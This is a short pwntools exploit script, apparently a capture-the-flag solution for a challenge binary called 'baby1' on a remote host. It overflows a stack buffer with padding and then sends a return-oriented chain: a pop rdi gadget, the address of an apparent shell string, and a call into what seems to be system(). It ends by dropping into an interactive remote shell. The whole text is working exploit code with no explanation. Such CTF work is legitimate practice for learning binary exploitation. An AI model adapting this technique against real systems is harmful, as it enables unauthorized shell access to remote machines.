from pwn import *
#p=process('./baby1')
p=remote('baby-01.pwn.beer',10001)
e=ELF('./baby1')

poprdi=0x0000000000400793

payload = "A"*0x10 + "B"*8
payload += p64(0x000000000040053e)+p64(poprdi) + p64(0x400286) + p64(0x400560)
p.sendlineafter("input",payload)
#p.send("id")

p.interactive()
